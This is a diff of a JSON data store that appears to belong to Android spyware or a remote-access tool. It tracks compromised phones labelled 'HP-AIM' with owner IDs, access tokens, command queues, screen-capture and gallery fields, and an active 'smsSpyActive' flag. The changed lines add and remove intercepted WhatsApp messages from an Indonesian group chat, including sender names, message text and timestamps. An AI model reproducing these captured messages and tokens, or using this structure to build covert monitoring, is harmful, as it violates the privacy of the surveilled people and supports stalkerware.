@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775042906294,
+    "lastSeen": 1775042909384,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12676 pesan): ~ 🕷️",
+        "content": "kan dapa plenger kak",
+        "time": "01/04 19:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775042911757
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (12675 pesan): ~ Dapa",
@@ -4011,14 +4019,6 @@
         "time": "01/04 19:19",
         "pkg": "com.whatsapp",
         "receivedAt": 1775042364287
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (12502 pesan): ~ 🕷️",
-        "content": "💟 Stiker",
-        "time": "01/04 19:19",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042364261
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775042907474,
+    "lastSeen": 1775042911436,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
